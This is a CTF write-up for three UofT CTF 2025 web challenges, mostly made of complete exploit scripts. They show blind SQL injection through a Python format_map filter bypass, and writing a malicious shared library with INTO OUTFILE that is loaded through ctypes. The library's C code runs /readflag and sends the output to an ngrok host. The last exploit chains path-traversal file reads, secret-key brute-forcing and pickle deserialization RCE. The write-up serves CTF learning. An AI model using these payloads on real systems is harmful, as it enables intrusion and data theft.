---
title: "UofT CTF 2025 - writeup"
date: "2025-01-14T00:00:00.000Z"
lang: EN
---

## ✅ Prepared: Flag 1

### Overview

The server implements a simple login system that uses MySQL.

![](/assets/blog/UotT/image.png)

To prevent SQL injection, the server uses the custom query builder. The query builder constructs the sanitized query as follows:

1. `username` and `password` is stored in the `DirtyString` class.
    ```python
    du = DirtyString(username, 'username')
    dp = DirtyString(password, 'password')
    ```
    `du.key` is `"username"` and `du.value` is the user input. The same goes for `dp`.

2. `QueryBuilder` is initialized with the query template and the `DirtyString`s.
    ```python
    qb = QueryBuilder(
        "SELECT * FROM users WHERE username = '{username}' AND password = '{password}'",
    [du, dp]
    )
    ```
    `pb.query_template` is the template, and `pb.dirty_strings` is a dictionary like `{username: du, password: dp}`.

3. `pb.build_query` is called.
4. Get all the placeholders using the following code.
    ```python
    def get_all_placeholders(self, query_template=None):
        pattern = re.compile(r'\{(\w+)\}')
        return pattern.findall(query_template)
    def build_query(self):
        query = self.query_template
        self.placeholders = self.get_all_placeholders(query)
        """ snap """
    ```
5. For each key in `self.placeholders`: 
    * If a `DirtyString` instance with the same key exists AND it's the first element in `self.placeholders`, set `format_map[k] = self.dirty_strings[k]`.get_value(). 
        * `dirty_strings[k].get_value()` raises an error if it contains non-ASCII characters or the following characters:
        ```python
        MALICIOUS_CHARS = ['"', "'", "\\", "/", "*", "+" "%", "-", ";", "#", "(", ")", " ", ","]
        ```
        * Otherwise, it returns `value`.
    * If a `DirtyString` instance with the same key exists but it's not the first element, set `format_map[k] = f"{{k}}"`.
        * This means it won't be replaced in the next step.
    * If there is no such `DirtyString` instance, set `format_map[k] = DirtyString`.
6. Update the query and the placeholders as follows:
    ```python
    query = query.format_map(type('FormatDict', (), {
        '__getitem__': lambda _, k: format_map[k] if isinstance(format_map[k], str) else format_map[k]("",k)
    })())
    self.placeholders = self.get_all_placeholders(query)
    ```
7. Repeat 5. to 6. until there are no more placeholders.

The goal of this challenge is to somehow achieve SQL injection to get the content of the following table.

```sql:init.sql
CREATE TABLE IF NOT EXISTS flags (
 id INT AUTO_INCREMENT PRIMARY KEY,
 flag VARCHAR(255) NOT NULL
);
INSERT INTO flags (flag) VALUES ("uoftctf{fake_flag_1}");
```


::: details Read all the relevant scripts
```python:app.py
import re
from flask import Flask, render_template, request, redirect, url_for, flash
import mysql.connector
import os
import setuptools

app = Flask(__name__)
app.secret_key = os.urandom(24)

DB_HOST = os.getenv('MYSQL_HOST', 'localhost')
DB_USER = os.getenv('MYSQL_USER', 'root')
DB_PASSWORD = os.getenv('MYSQL_PASSWORD', 'rootpassword')
DB_NAME = os.getenv('MYSQL_DB', 'prepared_db')

class MaliciousCharacterError(Exception):
    pass

class NonPrintableCharacterError(Exception):
    pass

class DirtyString:
    MALICIOUS_CHARS = ['"', "'", "\\", "/", "*", "+" "%", "-", ";", "#", "(", ")", " ", ","]

    def __init__(self, value, key):
        self.value = value
        self.key = key

    def __repr__(self):
        return self.get_value()

    def check_malicious(self):
        if not all(32 <= ord(c) <= 126 for c in self.value):
            raise NonPrintableCharacterError(f"Non-printable ASCII character found in '{self.key}'.")
        for char in self.value:
            if char in self.MALICIOUS_CHARS:
                raise MaliciousCharacterError(f"Malicious character '{char}' found in '{self.key}'")

    def get_value(self):
        self.check_malicious()
        return self.value

class QueryBuilder:
    def __init__(self, query_template, dirty_strings):
        self.query_template = query_template
        self.dirty_strings = {ds.key: ds for ds in dirty_strings}
        self.placeholders = self.get_all_placeholders(self.query_template)

    def get_all_placeholders(self, query_template=None):
        pattern = re.compile(r'\{(\w+)\}')
        return pattern.findall(query_template)

    def build_query(self):
        query = self.query_template
        self.placeholders = self.get_all_placeholders(query)
        while self.placeholders:
            key = self.placeholders[0]
            format_map = dict.fromkeys(self.placeholders, lambda _, k: f"{{{k}}}")
            
            for k in self.placeholders:
                if k in self.dirty_strings:
                    if key == k:
                        format_map[k] = self.dirty_strings[k].get_value()
                else:
                    format_map[k] = DirtyString
                    
            query = query.format_map(type('FormatDict', (), {
                '__getitem__': lambda _, k: format_map[k] if isinstance(format_map[k], str) else format_map[k]("",k)
            })())
            
            self.placeholders = self.get_all_placeholders(query)
            
        return query

def get_db_connection():
    try:
        cnx = mysql.connector.connect(
            host=DB_HOST,
            user=DB_USER,
            password=DB_PASSWORD,
            database=DB_NAME
        )
        return cnx
    except mysql.connector.Error as err:
        print(f"Error: {err}")
        return None

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = request.form
        username = data.get('username', '')
        password = data.get('password', '')

        if not username or not password:
            flash("Username and password are required.", 'error')
            return redirect(url_for('login'))

        try:
            du = DirtyString(username, 'username')
            dp = DirtyString(password, 'password')

            qb = QueryBuilder(
                "SELECT * FROM users WHERE username = '{username}' AND password = '{password}'",
                [du, dp]
            )
            sanitized_query = qb.build_query()
            print(f"Sanitized query: {sanitized_query}", flush=True)
        except (MaliciousCharacterError, NonPrintableCharacterError) as e:
            flash(str(e), 'error')
            return redirect(url_for('login'))
        except Exception as e:
            print(str(e), flush=True)
            flash("Invalid credentials.", 'error')
            return redirect(url_for('login'))

        cnx = get_db_connection()
        if not cnx:
            flash("Database connection failed.", 'error')
            return redirect(url_for('login'))

        cursor = cnx.cursor(dictionary=True)
        try:
            cursor.execute(sanitized_query)
            user = cursor.fetchone()
            if user:
                flash("Login successful!", 'success')
                return render_template('under_construction.html')
            else:
                flash("Invalid credentials.", 'error')
        except mysql.connector.Error as err:
            flash(f"Database query failed: {err}", 'error')
        finally:
            cursor.close()
            cnx.close()

    return render_template('login.html')

@app.route('/under_construction')
def under_construction():
    return render_template('under_construction.html')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)

```
:::

### Solution

[`str.format_map`](https://docs.python.org/3.10/library/stdtypes.html#str.format_map) works similarly to [`str.format`](https://docs.python.org/3.10/library/stdtypes.html#str.format_map), but it takes `dict`-like object as mapping instead of keyword argument. `str.format_map` accepts many syntaxes that enables us to process the mapping. This includes accessing the member of an instance using `.`, and getting an element of the list using `[0]`

For example:
```python
class User:
 name = "Bob"

user = User()

# prints "Hello, Bob!"
print("Hello, {user.name}!".format_map({"user": user})) 
```

If the key for the placeholder is `username` or `password`, the placeholder maps to `str`, so there isn't any interesting member that we can access.

Remember that if the key for the placeholder is something else, it will be a `DirtyString` instance with an empty value, rather than `str`. This means we can access `DirtyString.MALICIOUS_CHARS`!

For example, if I set the username to `{X}{X.MALICIOUS_CHARS[1]}`, it will be replaced with `'`. This enables us to insert any character in `MALICIOUS_CHARS` and perform SQL injection.

If the query (after being processed with query builder) looks like

```sql
SELECT * FROM users WHERE username = 'a' AND password = '' UNION SELECT flag, flag, flag FROM flags WHERE flag LIKE BINARY 'uoft%'#'
```

if the beginning of the flag matches `uoft`, then the login will be successful, and the `UNDER CONSTRUCTION` page will be shown. Otherwise, the page will redirect to the `login` page. We can use this as an oracle to perform blind SQL injection attacks.

We cannot use `{` and `}` because they will be recognized as part of a placeholder, and they are not included in `MALICIOUS_CHARS`. (This issue will be solved in Flag 2.) Since we know the format of the flag is in the format `uoftctf{fake_flag}`, we cannot perform a normal blind SQL injection method that uses `LIKE` to match from the start of the flag.

Instead, I got the flag in the following way:
1. Get all the characters in the flag using `LIKE BINARY '%x%'`.
2. Choose one character that is not in `uoftctf`. We can ensure that the character is located inside the brackets.
3. Blind search all the characters that follows the flag.
4. Blind search all the characters that precede the flag.
5. We know the result is the string inside the flag. Wrap it with `uoftctf{}`.

### Final exploit


```python:solver.py
import requests
import string


# URL = "https://prepared-1-ec0d3306c2ec8a0f.chal.uoftctf.org/"
URL = "http://localhost:5000/"

s = requests.session()
MALICIOUS_CHARS = ['"', "'", "\\", "/", "*", "+" "%", "-", ";", "#", "(", ")", " ", ","]

def check(s, _part):
    part = _part.replace("_", "\\_")
    inj = f"{{X}}' UNION SELECT flag, flag, flag FROM flags WHERE flag LIKE BINARY '%{part}%'#"

    for i, c in enumerate(MALICIOUS_CHARS):
        inj = inj.replace(c, "{X.MALICIOUS_CHARS[%d]}" % i)
    data = {
        "username": "a",
        "password": inj
    }
    r = s.post(URL, data=data)
    return "UNDER" in r.text
        

chars = string.ascii_letters + string.digits + "_"
used = ""

for char in chars:
    if check(s, char):
        used += char
        print(f"{used=}")

known = next(c for c in used if c not in "uoftctf")

didchange = True
while didchange:
    didchange = False
    for char in used:
        if check(s, known + char):
            known += char
            didchange = True
            print(known)
        

didchange = True
while didchange:
    didchange = False
    for char in used:
        if check(s, char + known):
            known = char + known
            didchange = True
            print(known)
```


## ✅ Prepared: Flag 2

### Overview

The server is the same as the "Prepared: Flag 1" challenge. We need to run `/readflag` in the shell to get the flag.

### Solution

Using SQL injection, we can write any binary files. [Reference: PayloadAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-command-execution)

```
SELECT * FROM users WHERE username = 'a' AND password = '' UNION SELECT 0xf09f9880,'','' INTO OUTFILE '/tmp/1.txt' FIELDS ESCAPED BY ''#
```

This will result in a file containing the Unicode character "😀". `ESCAPED BY ''` is necessary because, otherwise, all the null bytes would be escaped as `\0`. 

How can we use this to run a shell code inside the server? I first thought of overriding Python code but it doesn't work because we only have permission to write in `/tmp` and `/var/run/mysqld`. The same goes for [UDF in MySQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#command---udf-library) because it has to be located in `/usr/lib`.

My teammates pointed out that we could use [`ctype.cdll`](https://corgi.rip/posts/buckeye-writeups/#Gentleman) to load and execute a compiled CDLL with the following query:

```
{X.__init__.__globals__[os].sys.modules[ctypes].cdll[/path/to/cdll]}
```

The CDLL must be a compiled binary located somewhere on the server, and it can be created using the SQL injection mentioned above.

However, another problem arises. Since `/` is included in `MALICIOUS_CHARS`, we cannot use it directly inside the placeholder. To bypass this, we used double encoding. We noticed that you can access loaded modules using `{Y.__init__.__globals__[os].sys.modules}`. This includes the `string` module which includes `string.printable` that contains all the printable ASCII. This enabled us to express `{` and `}` using the placeholder. For example, if the query is the following:

```
{Y}{Y.__init__.__globals__[os].sys.modules[string].printable[90]}X{Y.__init__.__globals__[os].sys.modules[string].printable[92]}
```

After the first replacement, the result will be `{X}`. This can be used as a placeholder again, but the string inside `{}` can include any `MALICIOUS_CHARS`.


### Final Exploit

`lib.c` was written by my teammate.

```python:solver2.py
import requests
import os

# URL = "https://prepared-1-ec0d3306c2ec8a0f.chal.uoftctf.org/"
URL = "http://localhost:5000/"

os.system("gcc -c -O3 -fno-asynchronous-unwind-tables -fno-exceptions -fno-stack-protector -fPIC lib.c -o lib.o && gcc -shared -O3 -fno-asynchronous-unwind-tables -fno-exceptions -fno-stack-protector -Wl,--strip-all -znow -zrelro -o lib.so lib.o")

bytes = open("lib.so", "rb").read()
bytes_num = bytes.hex()

s = requests.session()
MALICIOUS_CHARS = ['"', "'", "\\", "/", "*", "+" "%", "-", ";", "#", "(", ")", " ", ","]

inj = f"""{{X}}' UNION SELECT 0x{bytes_num},'','' INTO OUTFILE '/tmp/lib.so' FIELDS ESCAPED BY ''#"""
for i, c in enumerate(MALICIOUS_CHARS):
    inj = inj.replace(c, "{X.MALICIOUS_CHARS[%d]}" % i)
data = {
    "username": "a",
    "password": inj
}
r = s.post(URL, data=data)
print(r.text)

inj = "{Y}{Y.__init__.__globals__[os].sys.modules[string].printable[90]}X{Y.__init__.__globals__[os].sys.modules[string].printable[92]}{Y.__init__.__globals__[os].sys.modules[string].printable[90]}X.__init__.__globals__[os].sys.modules[ctypes].cdll[{Y.MALICIOUS_CHARS[3]}tmp{Y.MALICIOUS_CHARS[3]}lib.so]{Y.__init__.__globals__[os].sys.modules[string].printable[92]}"

print(inj)
data = {
    "username": "a",
    "password": inj
}
r = s.post(URL, data=data)
print(r.text)
```

```c:lib.c
static const char* argv[] = {"/bin/sh", "-c", "python -c \"__import__('urllib.request',None,None,['urllib','request']).urlopen('https://xxx.ngrok.app/?'+__import__('subprocess').check_output(['/readflag']).decode())\"", 0};
static const char* filename = "/bin/sh";

__attribute__((constructor))
void f() {
    const char** local_argv = argv;
    
    __asm__ volatile (
        ".intel_syntax noprefix\n\t"
        "mov rax, 59\n\t"       // 59 is the syscall number for execve
        "mov rdi, %0\n\t"       // filename
        "mov rsi, %1\n\t"       // argv
        "xor rdx, rdx\n\t"      // NULL for envp
        "syscall\n\t"
        ".att_syntax prefix"    // Switch back to AT&T syntax for compatibility
        :
        : "r" (filename), "r" (local_argv)
        : "rax", "rdi", "rsi", "rdx"
    );
}
```

## ✅ Timeless

### Overview

You are presented with a blog service where you can sign up and create posts.

![](/assets/blog/UotT/image-1.png)

On your profile page, you can upload images for your icon. 

![](/assets/blog/UotT/image-2.png)

Files are uploaded to `/app/uploads/<username>/<hash>`. The server blocks usernames that contain `..` to prevent unintended upload and Local File Inclusion (LFI).

The server handles the user session with [`flask-session`](https://github.com/pallets-eco/flask-session) in [`FileSystem`](https://flask-session.readthedocs.io/en/latest/api.html#flask_session.filesystem.FileSystemSessionInterface) mode. The `SECRET_KEY` for the session is created using `datetime.now()` and `uuid.uuid1`.

The goal of this challenge is to run `/readflag` in the shell.

```python
START_TIME = datetime.now()
random.seed(int(START_TIME.timestamp()))
SECRET_KEY = str(uuid.uuid1(clock_seq=random.getrandbits(14)))
```
::: details Read the relevant scripts

```python:app/routes.py
@app.route('/profile_picture', methods=['GET'])
def profile_picture():
    username = request.args.get('username')
    user = User.query.filter_by(username=username).first()
    if user is None:
        return "User not found", 404
    if user.profile_photo is None:
        return send_file(os.path.join(app.static_folder, 'default.png'))
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], user.username + user.profile_photo)
    if not os.path.exists(file_path):
        return send_file(os.path.join(app.static_folder, 'default.png'))
    return send_file(file_path)

""" snap """

@app.route('/profile', methods=['POST'])
@login_required
def profile_post():
    user = User.query.get(session['user_id'])
    about_me = request.form.get('about_me')
    if about_me is not None:
        user.about_me = about_me
    file = request.files.get('profile_photo')
    if file:
        user.profile_photo = None
        user_directory = ensure_upload_directory(app.config['UPLOAD_FOLDER'], user.username)
        if not user_directory:
            flash('Failed to create user directory', 'error')
            return redirect(url_for('profile_get'))
        ext = os.path.splitext(file.filename)[1].lower()
        save_filename = f"{gen_filename(file.filename, user.username)}{ext}"
        if not allowed_file(save_filename):
            flash('Invalid file type', 'error')
            return redirect(url_for('profile_get'))
        filepath = os.path.join(user_directory, save_filename)
        if not os.path.exists(filepath):
            try:
                user.profile_photo = "/"+save_filename
                file.save(filepath)
            except:
                user.profile_photo = ''
                flash('Failed to save file', 'error')
                return redirect(url_for('profile_get'))
            finally:
                db.session.commit()
        else:
            flash('File already exists', 'error')
            return redirect(url_for('profile_get'))
    db.session.commit()
    flash('Profile updated successfully', 'success')
    return redirect(url_for('profile_get'))
```

```python:app/helpers.py
ALLOWED_EXTENSIONS = {'png', 'jpeg', 'jpg'}
def allowed_username(username):
    return ".." not in username
def allowed_file(filename):
    return not ("." in filename and (filename.rsplit('.', 1)[1].lower() not in ALLOWED_EXTENSIONS or ".." in filename))

def gen_filename(username, filename, timestamp=None):
    if not timestamp:
        timestamp = int(datetime.now().timestamp())
    hash_value = hashlib.md5(f"{username}_{filename}_{timestamp}".encode()).hexdigest()
    return hash_value

def ensure_upload_directory(base_path, username):
    if not allowed_username(username):
        return None
    user_directory = os.path.join(base_path, username)
    if os.path.exists(user_directory):
        return user_directory
    os.makedirs(user_directory, exist_ok=True)
    return user_directory
```

```python:config.py
from datetime import datetime
import os
import random
import uuid
class Config:
    JSON_SORT_KEYS = False
    START_TIME = datetime.now()
    random.seed(int(START_TIME.timestamp()))
    SECRET_KEY = str(uuid.uuid1(clock_seq=random.getrandbits(14)))
    SESSION_USE_SIGNER = True
    TEMPLATES_AUTO_RELOAD = False
    SESSION_PERMANENT = True
    SESSION_TYPE = 'filesystem'
    SQLALCHEMY_DATABASE_URI = f"sqlite:///{os.path.join(os.getcwd(), 'db', 'app.db')}"
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    UPLOAD_FOLDER = os.path.join(os.getcwd(), 'uploads')
```
:::

### Solution

#### Step 1: LFI

The `/profile_picture` endpoints compute the file path in the following code.

```python
file_path = os.path.join(app.config['UPLOAD_FOLDER'], user.username + user.profile_photo)
if not os.path.exists(file_path):
    return send_file(os.path.join(app.static_folder, 'default.png'))
return send_file(file_path)
```

The documentation for [`os.path.join`](https://docs.python.org/3.13/library/os.path.html#os.path.join) says that if the second argument is an absolute path, the function ignores the first argument. This means we can perform directory traversal by starting `user.username` with `/`.

The default value for `user.profile_photo` is `None`. In that case, `/app/uploads/default.png` will be served. If we update the file, the value of `user.profile_photo` will be `<hash>.<ext>`, and you cannot control the filename.

Upon closely examining the code, `user.profile_photo` is set to `''` if we fail to upload the file. If the username is `/etc/passwd`, the file path will be `/etc/passwd/<hash>.<ext>`, and saving the file will fail because `/etc/passwd` is not a directory.

```python
if not os.path.exists(filepath):
    try:
        user.profile_photo = "/"+save_filename
        file.save(filepath)
    except:
        user.profile_photo = ''
        flash('Failed to save file', 'error')
        return redirect(url_for('profile_get'))
    finally:
        db.session.commit()
```

Therefore, the next time we access `/profile_picture`, file_path will point to `/etc/passwd`, and the file will be served.

::: details Sample code to read `/etc/passwd` from the server

```python
import requests

# URL = "https://timeless-280e8f94de4a3a53.chal.uoftctf.org/"
URL = "http://localhost:5000/"
EVIL = "https://tchenio.ngrok.io/"

s = requests.session()
user = {
    "username": "/etc/passwd",
    "password": "x"
}
r = s.post(URL + "register", data=user)
r = s.post(URL + "login", data=user)

r = s.post(URL + "profile", files={
    "about_me": "aaa",
    "profile_photo": ("v.jpeg", "xxx")
})

r = s.get(URL + "profile_picture", params={
    "username": "/etc/passwd"
})
print(r.content)
```
:::

#### Step 2: Calculating SECRET_KEY

The `SECRET_KEY` is generated using `uuid.uuid1`. Below is the implementation:

```python:uuid.py
def uuid1(node=None, clock_seq=None):
    """Generate a UUID from a host ID, sequence number, and the current time.
    If 'node' is not given, getnode() is used to obtain the hardware
    address.  If 'clock_seq' is given, it is used as the sequence number;
    otherwise a random 14-bit sequence number is chosen."""

    """ snap """

    global _last_timestamp
    import time
    nanoseconds = time.time_ns()
    # 0x01b21dd213814000 is the number of 100-ns intervals between the
    # UUID epoch 1582-10-15 00:00:00 and the Unix epoch 1970-01-01 00:00:00.
    timestamp = nanoseconds // 100 + 0x01b21dd213814000
    if _last_timestamp is not None and timestamp <= _last_timestamp:
        timestamp = _last_timestamp + 1
    _last_timestamp = timestamp
    if clock_seq is None:
        import random
        clock_seq = random.getrandbits(14) # instead of stable storage
    time_low = timestamp & 0xffffffff
    time_mid = (timestamp >> 32) & 0xffff
    time_hi_version = (timestamp >> 48) & 0x0fff
    clock_seq_low = clock_seq & 0xff
    clock_seq_hi_variant = (clock_seq >> 8) & 0x3f
    if node is None:
        node = getnode()
    return UUID(fields=(time_low, time_mid, time_hi_version,
                        clock_seq_hi_variant, clock_seq_low, node), version=1)
```
The `getnode` function retrieves the server's MAC address. Since `clock_seq` is provided using `random.getrandbits(14)`, and the `random.seed` uses `START_TIME = date.now()`, the information we need to calculate `SECRET_KEY` is as follows:
* The MAC address of the server
* The value of `int(START_TIME.timestamp())`
* The time that the UUID is created, in 100 nanosecond precision

According to [this blog](https://blog.gregscharf.com/2023/04/09/lfi-to-rce-in-flask-werkzeug-application/), the MAC address of the server is written in `/sys/class/net/eth0/address`. For some reason, the `Content-Length` header did not match the actual content length, resulting in `requests.get` raising an error. This can be solved using `stream=True` option.

```python
partial_content = b""
try:
    r = s.get(URL + "profile_picture", params={
        "username": "/sys/class/net/eth0/address"
    },stream=True)
    for chunk in r.iter_content(chunk_size=1):
        if chunk:
            partial_content += chunk
except:
    pass
```

If we access to the `/status` endpoint, we get the following response:

```python
{"status":"ok","server_time":"2025-01-14 09:21:09.758812","uptime":"0:02:48.966212"}
```

By calculating `server_time - uptime`, we can determine `START_TIME` with millisecond precision. Hence, the seed for `random.seed` can be calculated.

We know the UUID was calculated soon after `START_TIME` was determined. If we can check its validity offline, we can brute-force the exact value of the time with 100 nanosecond precision.

The session token looks like this:
```
-0DX43ZHxRUANBy4kfY35IEHpFLKQxXs2K4tPEuXthI.43PdPtt14XDlO_TYbw6eCqY1MH0
```

The string before the `.` is the session ID, and the string after the `.` is the verification code. The verification code is signed and unsigned using [`itsdangerous.Signer`](https://github.com/pallets-eco/flask-session/blob/development/src/flask_session/base.py#L200). Hence, we used the following code to determine the calculated `SECRET_KEY` is valid:

```python
token = s.cookies['session']
value = token.split('.')[0]
sig = token.split('.')[1]
signer = Signer(SECRET_KEY, 'flask-session',key_derivation="hmac")
if signer.verify_signature(value, sig):
    print(SECRET_KEY)
```

#### Step 3: RCE

With the `SECRET_KEY` calculated, we can assign any value to the session ID. How do we connect this to RCE? 

Remember that the session value is stored in the file system using `flask-session`. The session file consists of 4 bytes of unsigned int that represents the generated time, followed by pickle bytes (See [here](https://github.com/pallets-eco/cachelib/blob/9a4de4df1bce035d27c93a34608a8af4413d5b59/src/cachelib/file.py#L218) and [here](https://github.com/pallets-eco/cachelib/blob/9a4de4df1bce035d27c93a34608a8af4413d5b59/src/cachelib/serializers.py#L27)).

It is well known that you can execute any code if the program accepts deserializing any pickle bytes. For example:

```python
class RCE:
    def __reduce__(self):
        cmd = ('/readflag > /app/app/static/flag.txt')
        return os.system, (cmd,)
pickled_payload = pickle.dumps(RCE())

# Run the following inside the server to RCE
pickle.loads(pickled_payload)
```

The session file is saved in `/app/flask_session/<hash>`, where the hash is

```python
hashlib.md5(("session:" + session_id).encode('utf-8')).hexdigest()
```

(See [here](https://github.com/pallets-eco/flask-session/blob/bc2fe67958bff5e46023c4807b5e75ca350554eb/src/flask_session/defaults.py#L7), [here](https://github.com/pallets-eco/flask-session/blob/bc2fe67958bff5e46023c4807b5e75ca350554eb/src/flask_session/base.py#L218) and [here](https://github.com/pallets-eco/cachelib/blob/9a4de4df1bce035d27c93a34608a8af4413d5b59/src/cachelib/file.py#L210))

If the username starts with `/`, the file is stored in `<username>/<hash>[.<ext>]`. `<ext>` is ommitted if the filename doesn't contain any extension. `<hash>` is generated using the following code.

```python
def gen_filename(username, filename, timestamp=None):
    if not timestamp:
        timestamp = int(datetime.now().timestamp())
    hash_value = hashlib.md5(f"{username}_{filename}_{timestamp}".encode()).hexdigest()
    return hash_value
```

However, this function is used wrong, and the arguments are swapped.

```python
save_filename = f"{gen_filename(file.filename, user.username)}{ext}"
```

This means if the username is `/app/flask_session` and the filename is `session:`, the hash will match
```python
hashlib.md5(f"session:_/app/flask_session_{int(datetime.now().timestamp())}").hexdigest()
```
This will match the file for the session ID `f"_/app/flask_session_{int(datetime.now().timestamp())}"`. By generating the verification code for such session ID and sending it through the cookie, we made `flask-session` to read the session file and execute the code.

### Final exploit

```python
import os
import pickle
import struct
import requests
from itsdangerous import Signer
from datetime import datetime, timedelta, timezone
import random
import uuid

# URL = "https://timeless-280e8f94de4a3a53.chal.uoftctf.org/"
URL = "http://localhost:5000/"
EVIL = "https://tchenio.ngrok.io/"

s = requests.session()
user = {
    "username": "/sys/class/net/eth0/address",
    "password": "foobar"
}
r = s.post(URL + "register", data=user)
r = s.post(URL + "login", data=user)
token = s.cookies['session']
r = s.post(URL + "profile", files={
    "about_me": "aaa",
    "profile_photo": ("v.jpeg", "xxx")
})

partial_content = b""
try:
    r = s.get(URL + "profile_picture", params={
        "username": "/sys/class/net/eth0/address"
    },stream=True)
    for chunk in r.iter_content(chunk_size=1):
        if chunk:
            partial_content += chunk
except:
    pass

mac = partial_content.decode().strip()

r = s.get(URL + "status")
print(r.text)
server_time = datetime.strptime(r.json()['server_time'], "%Y-%m-%d %H:%M:%S.%f").replace(tzinfo=timezone.utc)
uptime = datetime.strptime(r.json()['uptime'], "%H:%M:%S.%f").replace(tzinfo=timezone.utc)
uptime = timedelta(hours=uptime.hour, minutes=uptime.minute, seconds=uptime.second, microseconds=uptime.microsecond)

random.seed(int((server_time - uptime).timestamp()))
clock_seq = random.getrandbits(14)
clock_seq_low = clock_seq & 0xff
clock_seq_hi_variant = (clock_seq >> 8) & 0x3f

SECRET_KEY = None
value = token.split('.')[0]
sig = token.split('.')[1]

for ns_diff in range(10_000_000):
    timestamp = int((server_time - uptime).timestamp() * 10_000_000) + 0x01b21dd213814000 + ns_diff
    time_low = timestamp & 0xffffffff
    time_mid = (timestamp >> 32) & 0xffff
    time_hi_version = (timestamp >> 48) & 0x0fff
    node = int(mac.replace(":",""),16)
    SECRET_KEY = str(uuid.UUID(fields=(time_low, time_mid, time_hi_version, clock_seq_hi_variant, clock_seq_low, node), version=1))

    signer = Signer(SECRET_KEY, 'flask-session',key_derivation="hmac")
    if signer.verify_signature(value, sig):
        print(SECRET_KEY)
        break

user = {
    "username": "/app/flask_session",
    "password": "foobar"
}
r = s.post(URL + "register", data=user)
r = s.post(URL + "login", data=user)

class RCE:
    def __reduce__(self):
        cmd = ('/readflag > /app/app/static/flag.txt')
        return os.system, (cmd,)
pickle_time = struct.pack("I", 0000)
pickled_payload = pickle_time + pickle.dumps(RCE())

r = s.post(URL + "profile", files={
    "about_me": "aaa",
    "profile_photo": ("session:/.png", pickled_payload)
})

s = requests.session()
signer = Signer(SECRET_KEY, 'flask-session',key_derivation="hmac")

s.cookies['session'] = signer.sign(f"/.png_/app/flask_session_{int(datetime.now().timestamp())}").decode()

r = s.get(URL)
r = requests.get(URL + "static/flag.txt")
print(r.text)
```